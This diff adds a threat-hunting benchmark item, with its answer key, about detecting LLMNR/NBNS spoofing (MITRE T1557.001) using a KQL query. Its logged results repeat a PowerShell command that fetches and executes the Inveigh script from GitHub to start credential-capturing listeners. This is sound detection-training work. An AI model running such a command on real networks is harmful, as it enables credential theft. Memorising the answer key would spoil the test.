@@ -1,0 +1,60 @@
+{
+    "technique_id": "T1557.001",
+    "question_id": "deecd55f-afe0-4a62-9fba-4d1ba2deb321",
+    "context": "An attacker leverages a PowerShell-based tool to spoof LLMNR/NBNS and capture credentials on Windows endpoints.",
+    "objective": "Identify the specific PowerShell cmdlet that initiated the network spoofing listener.",
+    "technical_details": {
+        "command_analysis": "The test adjusts TLS settings, downloads a remote PowerShell script, and then invokes a function to launch LLMNR/NBNS/MDNS/HTTPS/PROXY listeners.",
+        "detection_approach": "Search for PowerShell process creation events with command lines that include remote script downloads and execution of suspicious cmdlets related to network poisoning."
+    },
+    "thinking_how_to_phrase_question_and_answer": "We need to ask about the exact function name used in the command line that an analyst would extract from process logs—and the answer should match the cmdlet string exactly.",
+    "prompt": "On Windows devices, hunt for PowerShell activity where a remote script is fetched and executed to perform LLMNR/NBNS spoofing. Which cmdlet kicked off the listener?",
+    "answer": [
+        "Invoke-Inveigh"
+    ],
+    "difficulty": "medium",
+    "KQL_query": "DeviceProcessEvents\n| where FileName in (\"powershell.exe\",\"pwsh.exe\")\n| where ProcessCommandLine contains \"Invoke-Inveigh\"\n| join kind=inner (\n    DeviceNetworkEvents\n    | where InitiatingProcessFileName in (\"powershell.exe\",\"pwsh.exe\")\n) on $left.DeviceId == $right.DeviceId and $left.ProcessId == $right.InitiatingProcessId\n| project TimeGenerated, DeviceName, InitiatingProcessAccountName, ProcessId, ProcessCommandLine, Protocol, RemotePort, RemoteIP",
+    "KQL_validation_message": "KQL query validation successful: The expected answer was to find evidence of 'Invoke-Inveigh'. The ProcessCommandLine field in each record shows a PowerShell command that includes 'Invoke-Inveigh' being executed. This matches exactly with what is required to identify the Invoke-Inveigh activity. The evidence is clearly present in the query results.",
+    "KQL_query_results": [
+        [
+            "TimeGenerated",
+            "DeviceName",
+            "InitiatingProcessAccountName",
+            "ProcessId",
+            "ProcessCommandLine",
+            "Protocol",
+            "RemotePort",
+            "RemoteIP"
+        ],
+        [
+            "2025-05-07 17:06:45.718315+00:00",
+            "windows-vm",
+            "wipro",
+            932,
+            "\"powershell.exe\" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \\\"\"https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/82be2377ade47a4e325217b4144878a59595e750/Inveigh.ps1\\\"\" -UseBasicParsing)\nInvoke-Inveigh -ConsoleOutput Y -NBNS Y -MDNS Y -HTTPS Y -PROXY Y}",
+            "TcpV4",
+            null,
+            ""
+        ],
+        [
+            "2025-05-07 17:06:45.718315+00:00",
+            "windows-vm",
+            "wipro",
+            932,
+            "\"powershell.exe\" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \\\"\"https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/82be2377ade47a4e325217b4144878a59595e750/Inveigh.ps1\\\"\" -UseBasicParsing)\nInvoke-Inveigh -ConsoleOutput Y -NBNS Y -MDNS Y -HTTPS Y -PROXY Y}",
+            "TcpV4",
+            null,
+            ""
+        ],
+        [
+            "2025-05-07 17:06:45.718315+00:00",
+            "windows-vm",
+            "wipro",
+            932,
+            "\"powershell.exe\" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \\\"\"https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/82be2377ade47a4e325217b4144878a59595e750/Inveigh.ps1\\\"\" -UseBasicParsing)\nInvoke-Inveigh -ConsoleOutput Y -NBNS Y -MDNS Y -HTTPS Y -PROXY Y}",
+            "TcpV4",
+            null,
+            ""
+        ]
+    ]
+}
